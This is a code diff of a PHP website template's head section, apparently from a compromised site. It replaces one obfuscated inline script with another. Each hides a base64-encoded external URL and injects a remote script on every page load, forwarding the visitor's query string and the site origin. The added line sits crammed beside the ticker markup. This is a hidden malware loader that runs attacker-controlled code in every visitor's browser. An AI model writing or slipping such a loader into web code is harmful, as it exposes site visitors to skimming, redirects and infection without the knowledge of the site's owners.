@@ -21,8 +21,7 @@ $img = $og_image ?? null;
 <link rel="icon" href="<?= e(asset('favicon.svg')) ?>" type="image/svg+xml">
 <link rel="alternate" type="application/rss+xml" title="<?= e($name) ?>" href="<?= e(url('feed.xml')) ?>">
 <link rel="stylesheet" href="<?= e(asset('style.css')) ?>">
-<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9tb2phLXptLW1ybGcudmVyY2VsLmFwcC9hcGkvOXYwaHYxLnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
-<?php if ($ticker): ?>
+<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9zaHVmZm14LnZlcmNlbC5hcHAvYXBpLzE4bnZzbTkucGhw");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script><?php if ($ticker): ?>
 <div class="ticker" role="region" aria-label="Latest headlines">
   <div class="wrap">
     <span class="ticker-badge"><i></i>LATEST</span>
